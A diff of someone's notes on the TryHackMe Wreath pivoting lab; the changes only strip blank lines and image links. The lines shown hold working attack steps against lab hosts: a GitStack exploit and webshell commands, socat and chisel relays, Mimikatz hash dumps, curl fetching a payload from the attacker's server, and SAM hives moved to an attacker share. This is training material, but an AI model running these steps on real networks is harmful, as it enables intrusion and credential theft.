@@ -5,7 +5,6 @@ Learn how to pivot through a network by compromising a public facing web machine
 
 ![](https://assets.tryhackme.com/room-banners/wreath_banner.png)
 
-![[Pasted image 20230603132636.png]]
 ### Task 1  Intro Introduction
 
  Download Task Files
@@ -213,7 +212,6 @@ This should not be necessary on the AttackBox.
 
 Question Done
 
-
 ### Task 5  Webserver Enumeration
 
 [**Video**](https://youtu.be/3ddDBa6tAq0)
@@ -374,8 +372,6 @@ Nmap done: 1 IP address (1 host up) scanned in 48.59 seconds
 
 https://www.rapid7.com/db/vulnerabilities/http-webmin-cve-2019-15107/
 
-
-
 ```
 
 How many of the first 15000 ports are open on the target?  
@@ -415,8 +411,6 @@ In real life we would perform a "footprinting" phase of the engagement at this p
 Read through the text on the page. What is Thomas' mobile phone number?
 
 Look at the bottom of the page.
-
-![[Pasted image 20230603140607.png]]
 
 *+447821548812*
 
@@ -787,7 +781,6 @@ There are two main methods encompassed in this area of pentesting:
 
 Intrusion Detection System (IDS) is a system that detects unauthorised network and system intrusions. Examples include detecting unauthorised devices connected to the local network and unauthorised users accessing a system or modifying a file.
 
-
 - **Port Forwarding:** Creating a connection between a local port and a single port on a target, via a compromised host
 
 A proxy is good if we want to redirect lots of different kinds of traffic into our target network -- for example, with an nmap scan, or to access multiple ports on multiple different machines.
@@ -940,7 +933,6 @@ IP6.ADDRESS[1]:                         ::1/128
 IP6.GATEWAY:                            --
 IP6.ROUTE[1]:                           dst = ::1/128, nh = ::, mt = 256
 
-
 ```
 
 What is the absolute path to the file containing DNS entries on Linux?  
@@ -1029,7 +1021,6 @@ Once activated, all of your browser traffic will be redirected through the chose
 With the proxy activated, you can simply navigate to the target domain or IP in your browser and the proxy will take care of the rest!  
 
 Answer the questions below
-
 
 What line would you put in your proxychains config file to redirect through a socks4 proxy on 127.0.0.1:4242?  
 
@@ -1188,7 +1179,6 @@ witty     795429  0.0  0.0   6464  2072 pts/2    S+   13:09   0:00 grep --color=
 ┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌┌┌┌─┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
 └─$ 
 
-
 ```
 
 If you're connecting to an SSH server _from_ your attacking machine to create a port forward, would this be a local (L) port forward or a remote (R) port forward?  
@@ -1273,7 +1263,6 @@ PuTTY-User-Key-File-3: ssh-rsa
 Encryption: aes256-cbc
 Comment: witty@kali
 ....
-
 
 ```
 
@@ -1438,7 +1427,6 @@ root
 [1]+  Done                    ./socat-witty tcp-l:8000 tcp:10.50.82.74:443  (wd: /tmp/witty)
 [root@prod-serv tmp]# kill %1
 
-
 ```
 
 Which socat option allows you to reuse the same listening port for more than one connection?  
@@ -1599,7 +1587,6 @@ chisel                                                      100% 8545KB 820.6KB/
                                                                                                 
 [1]  + terminated  ./chisel server -p 1337 --reverse
 
-
 ```
 
 What command would you use to start a chisel server for a reverse connection on your attacking machine?
@@ -1693,9 +1680,7 @@ like using in Holo network
 └─$ sshuttle -r root@10.200.81.200 --ssh-cmd "ssh -i wreath_idrsa" 10.200.81.0/24 -x 10.200.81.200
 c : Connected to server.
 
-
 ```
-
 
 How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16  
 
@@ -1871,7 +1856,6 @@ Read data files from: /etc
 Nmap done: 1 IP address (1 host up) scanned in 90.84 seconds
            Raw packets sent: 18517 (814.716KB) | Rcvd: 75 (3.284KB)
 
-
 ```
 
 Excluding the out of scope hosts, and the current host (`.200`), how many hosts were discovered active on the network?  
@@ -1940,10 +1924,7 @@ GitStack - Unsanitized Argument Remote C | windows/remote/44356.rb
 GitStack 2.3.10 - Remote Code Execution  | php/webapps/43777.py
 ----------------------------------------- -----------------------------
 
-
-
 ```
-
 
 What is the name of the program running the service?  
 
@@ -2176,7 +2157,6 @@ print "[+] Execute command"
 r = requests.post("http://{}/web/exploit_witty.php".format(ip), data={'a' : command})
 print r.text.encode(sys.stdout.encoding, errors='replace')
 
-
 ```
 
 Look at the information at the top of the script. On what date was this exploit written?  
@@ -2341,7 +2321,6 @@ Your GitStack credentials were not entered correcly. Please ask your GitStack ad
 └─$ curl -X POST http://10.200.81.150/web/exploit_witty.php -d "a=ipconfig"
 "
 Windows IP Configuration
-
 
 Ethernet adapter Ethernet:
 
@@ -2613,7 +2592,6 @@ Pick a method (cURL, BurpSuite, or any others) and get a shell!
 
  Completed
 
-
 ### Task 21  Git Server Stabilisation & Post Exploitation
 
 [**Video**](https://youtu.be/GOOYZCX6yY4)
@@ -2860,7 +2838,6 @@ Supplemental Credentials:
     Credentials
       des_cbc_md5       : e3915234101c6b75
 
-
 RID  : 000001f5 (501)
 User : Guest
 
@@ -2890,7 +2867,6 @@ Supplemental Credentials:
     Default Salt : WDAGUtilityAccount
     Credentials
       des_cbc_md5       : b6f1bac2346d9e2c
-
 
 RID  : 000003e9 (1001)
 User : Thomas
@@ -2922,7 +2898,6 @@ Supplemental Credentials:
     OldCredentials
       des_cbc_md5       : 7f16a47cef890b3b
 
-
 RID  : 000003ea (1002)
 User : donhew
   Hash NTLM: 2ecd55dbcf1b489459692f5eb5f7f508
@@ -2946,7 +2921,6 @@ Supplemental Credentials:
     Default Salt : GIT-SERVdonhew
     Credentials
       des_cbc_md5       : 3d01c8cd018c62a7
-
 
 RID  : 000003eb (1003)
 User : witty
@@ -2988,8 +2962,6 @@ Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\Administrator\Documents> hostname
 git-serv
 
-
-
 ```
 
 Create an account on the target. Assign it to the `Administrators` and `Remote Management Users` groups.  
@@ -3001,8 +2973,6 @@ Authenticate with WinRM -- make sure you can get a stable session on the target.
  Completed
 
 Authenticate with RDP, sharing a local copy of Mimikatz, then dump the password hashes for the users in the system.
-
-![[Pasted image 20230612193458.png]]
 
 What is the Administrator password hash?  
 
@@ -3126,7 +3096,6 @@ Install and execute Empire/Starkiller
 
  Completed
 
-
 ### Task 24  Command and Control Empire: Overview
 
 [**Video**](https://youtu.be/9cfVFaH3Ty0)
@@ -3160,7 +3129,6 @@ Question Done
 Can we get an agent back from the git server directly (Aye/Nay)?  
 
 *Nay*
-
 
 ### Task 25  Command and Control Empire: Listeners
 
@@ -3228,7 +3196,6 @@ Answer the questions below
 Start a listener in Empire and/or Starkiller  
 
  Completed
-
 
 ### Task 26  Command and Control Empire: Stagers
 
@@ -3417,7 +3384,6 @@ Create a `http_hop` listener in Empire CLI and/or Starkiller.
 
  Completed
 
-
 ### Task 30  Command and Control Empire: Modules
 
 [**Video**](https://youtu.be/ICYUaPShHKQ)
@@ -3478,7 +3444,6 @@ Answer the questions below
 Read the above information and try to experiment with the Empire Modules available.  
 
  Completed
-
 
 ### Task 31  Command and Control Empire: Interactive Shell
 
@@ -3584,14 +3549,11 @@ Answer the questions below
 *Evil-WinRM* PS C:\Users\Administrator\Documents> echo "hi" > test.txt
 *Evil-WinRM* PS C:\Users\Administrator\Documents> ls
 
-
     Directory: C:\Users\Administrator\Documents
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 -a----        6/16/2023  12:31 AM             10 test.txt
-
 
 *Evil-WinRM* PS C:\Users\Administrator\Documents> download test.txt
 Info: Downloading test.txt to ./test.txt
@@ -3631,7 +3593,6 @@ SYNOPSIS
     Required Dependencies: None
     Optional Dependencies: None
 
-
 SYNTAX
     Invoke-Portscan -Hosts <String[]> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-Open] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts
     <Int32>] [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]
@@ -3639,10 +3600,8 @@ SYNTAX
     Invoke-Portscan -HostFile <String> [-ExcludeHosts <String>] [-Ports <String>] [-PortFile <String>] [-TopPorts <String>] [-ExcludedPorts <String>] [-Open] [-SkipDiscovery] [-PingOnly] [-DiscoveryPorts <String>] [-Threads <Int32>] [-nHosts
     <Int32>] [-Timeout <Int32>] [-SleepTimer <Int32>] [-SyncFreq <Int32>] [-T <Int32>] [-GrepOut <String>] [-XmlOut <String>] [-ReadableOut <String>] [-AllformatsOut <String>] [-noProgressMeter] [-quiet] [-ForceOverwrite] [<CommonParameters>]
 
-
 DESCRIPTION
     Does a simple port scan using regular sockets, based (pretty) loosely on nmap
-
 
 RELATED LINKS
     http://webstersprodigy.net
@@ -3655,15 +3614,12 @@ REMARKS
 
 *Evil-WinRM* PS C:\Windows\Temp> Invoke-Portscan -Hosts 10.200.81.150 -TopPorts 50
 
-
 Hostname      : 10.200.81.150
 alive         : True
 openPorts     : {80, 3389, 445, 139...}
 closedPorts   : {443, 23, 21, 110...}
 filteredPorts : {}
 finishTime    : 6/16/2023 12:41:03 AM
-
-
 
 ```
 
@@ -3725,10 +3681,6 @@ Whether you choose the recommended option or not, get a pivot up and running!
 
 If using chisel, run the chisel server on the Gitserver and the chisel client on your attacking machine.
 
-![[Pasted image 20230615191654.png]]
-
-![[Pasted image 20230615191854.png]]
-
 Completed
 
 Access the website in your web browser (using FoxyProxy if you used the recommended forward proxy, or directly if you used a port forward).
@@ -3736,7 +3688,6 @@ Access the website in your web browser (using FoxyProxy if you used the recommen
 Using the Wappalyzer browser extension ([Firefox](https://addons.mozilla.org/en-GB/firefox/addon/wappalyzer/) | [Chrome](https://chrome.google.com/webstore/detail/wappalyzer/gppongmhjkpfnbhagpmjfkannfbllamg?hl=en)) or an alternative method, identify the server-side Programming language (including the version number) used on the website.  
 
 *PHP 7.4.11*
-
 
 ### Task 35  Personal PC The Wonders of Git
 
@@ -3758,9 +3709,7 @@ Answer the questions below
 *Evil-WinRM* PS C:\Users\Thomas> cd C:\
 *Evil-WinRM* PS C:\> ls
 
-
     Directory: C:\
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -3771,13 +3720,10 @@ d-----       12/20/2020   3:56 PM                Program Files (x86)
 d-r---        6/13/2023   1:29 AM                Users
 d-----        1/13/2021   1:05 PM                Windows
 
-
 *Evil-WinRM* PS C:\> cd GitStack
 *Evil-WinRM* PS C:\GitStack> ls
 
-
     Directory: C:\GitStack
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
@@ -3792,18 +3738,14 @@ d-----        11/8/2020   2:35 PM                repositories
 d-----        11/8/2020   1:28 PM                templates
 -a----        11/8/2020   1:28 PM          66800 uninstall.exe
 
-
 *Evil-WinRM* PS C:\GitStack> cd repositories
 *Evil-WinRM* PS C:\GitStack\repositories> ls
 
-
     Directory: C:\GitStack\repositories
-
 
 Mode                LastWriteTime         Length Name
 ----                -------------         ------ ----
 d-----         1/2/2021   7:05 PM                Website.git
-
 
 *Evil-WinRM* PS C:\GitStack\repositories> pwd
 
@@ -3967,7 +3909,6 @@ drwxr-xr-x 6 witty witty 4096 Jun 16 10:46 2-70dde80cc19ec76704567996738894828f4
 ┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107/Website.git/Website]
 └─$ separator="======================================="; for i in $(ls); do printf "\n\n$separator\n\033[4;1m$i\033[0m\n$(cat $i/commit-meta.txt)\n"; done; printf "\n\n$separator\n\n\n"
 
-
 =======================================
 0-345ac8b236064b431fa43f53d91c98c4834ef8f3
 tree c4726fef596741220267e2b1e014024b93fced78
@@ -3976,7 +3917,6 @@ author twreath <me@thomaswreath.thm> 1609614315 +0000
 committer twreath <me@thomaswreath.thm> 1609614315 +0000
 
 Updated the filter
-
 
 =======================================
 1-82dfc97bec0d7582d485d9031c09abcb5c6b18f2
@@ -3987,7 +3927,6 @@ committer twreath <me@thomaswreath.thm> 1608592351 +0000
 
 Initial Commit for the back-end
 
-
 =======================================
 2-70dde80cc19ec76704567996738894828f4ee895
 tree d6f9cc307e317dec7be4fe80fb0ca569a97dd984
@@ -3996,9 +3935,7 @@ committer twreath <me@thomaswreath.thm> 1604849458 +0000
 
 Static Website Commit
 
-
 =======================================
-
 
 ```
 
@@ -4151,7 +4088,6 @@ Answer the questions below
 		header("location: ./?msg=Method");
 	}
 
-
 	if(isset($_GET["msg"])){
 		$msg = $_GET["msg"];
 		switch ($msg) {
@@ -4198,8 +4134,6 @@ Answer the questions below
 		</main>	
 	</body>
 </html>
-
-
 
 ```
 
@@ -4268,7 +4202,6 @@ In summary:
 We have ourselves a vulnerability!  
 
  Completed
-
 
 ### Task 37  Personal PC Exploit PoC
 
@@ -4423,7 +4356,6 @@ We have the ability to execute arbitrary PHP code on the system!
 
  Completed
 
-
 ### Task 38  AV Evasion Introduction
 
 [**Video**](https://youtu.be/2PXuha963-I)
@@ -4451,7 +4383,6 @@ AV Evasion usually involves some form of obfuscation when it comes to payloads.
 
 Answer the questions below
 
-
 Which category of evasion covers uploading a file to the storage on the target before executing it?  
 
 *On-Disk Evasion*
@@ -4463,7 +4394,6 @@ What does AMSI stand for?
 Which category of evasion does AMSI affect?  
 
 *In-Memory Evasion*
-
 
 ### Task 39  AV Evasion AV Detection Methods
 
@@ -4532,7 +4462,6 @@ What could be added to a file to ensure that only a user can open it (preventing
 This only works with certain delivery methods, if you can trick a user into opening/executing the file.
 
 *Password*
-
 
 ### Task 40  AV Evasion PHP Payload Obfuscation
 
@@ -4731,7 +4660,6 @@ What is our current username (include the domain in this)?
 
 	*wreath-pc\thomas*
 
-
 ### Task 41  AV Evasion Compiling Netcat & Reverse Shell!
 
 [**Video**](https://youtu.be/aIkOMYVVYws)
@@ -4806,7 +4734,6 @@ Microsoft Windows [Version 10.0.17763.1637]
 C:\xampp\htdocs\resources\uploads>whoami
 whoami
 wreath-pc\thomas
-
 
 ```
 
@@ -4950,7 +4877,6 @@ SERVICE_NAME: SystemExplorerHelpService
 C:\xampp\htdocs\resources\uploads>powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
 
-
 Path   : Microsoft.PowerShell.Core\FileSystem::C:\Program Files (x86)\System Explorer
 Owner  : BUILTIN\Administrators
 Group  : WREATH-PC\None
@@ -4974,7 +4900,6 @@ Sddl   : O:BAG:S-1-5-21-3963238053-2357614183-4023578609-513D:AI(A;OICI;FA;;;BU)
          64)(A;ID;FA;;;SY)(A;OICIIOID;GA;;;SY)(A;ID;FA;;;BA)(A;OICIIOID;GA;;;BA)(A;ID;0x1200a9;;;BU)(A;OICIIOID;GXGR;;;
          BU)(A;OICIIOID;GA;;;CO)(A;ID;0x1200a9;;;AC)(A;OICIIOID;GXGR;;;AC)(A;ID;0x1200a9;;;S-1-15-2-2)(A;OICIIOID;GXGR;
          ;;S-1-15-2-2)
-
 
 ```
 
@@ -5041,7 +4966,6 @@ That said, we will stick to the unquoted service path vulnerability purely to av
 **Bonus Question (optional):** Try to get a copy of WinPEAS up to the target (either the obfuscated executable file, or the batch variant) and run it. You will see that there are many more potential vulnerabilities on this target -- mainly due to patches that haven't been installed.  
 
  Completed
-
 
 ### Task 43  AV Evasion Privilege Escalation
 
@@ -5140,7 +5064,6 @@ curl http://10.50.88.115/Wrapper.exe -o "C:\xampp\htdocs\resources\uploads\Wrapp
                                  Dload  Upload   Total   Spent    Left  Speed
 100  3584  100  3584    0     0   3584      0  0:00:01 --:--:--  0:00:01  9166
 
-
 ┌──(witty㉿kali)-[~/Downloads/CVE-2019-15107]
 └─$ sudo python3 -m http.server 80
 [sudo] password for witty: 
@@ -5186,7 +5109,6 @@ SERVICE_NAME: SystemExplorerHelpService
         CHECKPOINT         : 0x0
         WAIT_HINT          : 0x1388
 
-
 C:\xampp\htdocs\resources\uploads>sc start SystemExplorerHelpService
 sc start SystemExplorerHelpService
 [SC] StartService FAILED 1053:
@@ -5206,7 +5128,6 @@ nt authority\system
 
 C:\Windows\system32>del "C:\Program Files (x86)\System Explorer\System.exe"
 del "C:\Program Files (x86)\System Explorer\System.exe"
-
 
 ```
 
@@ -5386,11 +5307,9 @@ C:\Windows\system32>net use \\10.50.88.115\share3 /USER:user3 s3cureP@ssword
 net use \\10.50.88.115\share3 /USER:user3 s3cureP@ssword
 The command completed successfully.
 
-
 C:\Windows\system32>net use
 net use
 New connections will be remembered.
-
 
 Status       Local     Remote                    Network
 
@@ -5417,7 +5336,6 @@ Impacket v0.10.1.dev1+20230616.115447.d1f16d8e - Copyright 2022 Fortra
 [*] Disconnecting Share(1:IPC$)
 [*] Connecting Share(3:IPC$)
 [*] Disconnecting Share(3:IPC$)
-
 
 C:\Windows\system32>move sam.bak \\10.50.88.115\share3\sam.bak
 move sam.bak \\10.50.88.115\share3\sam.bak
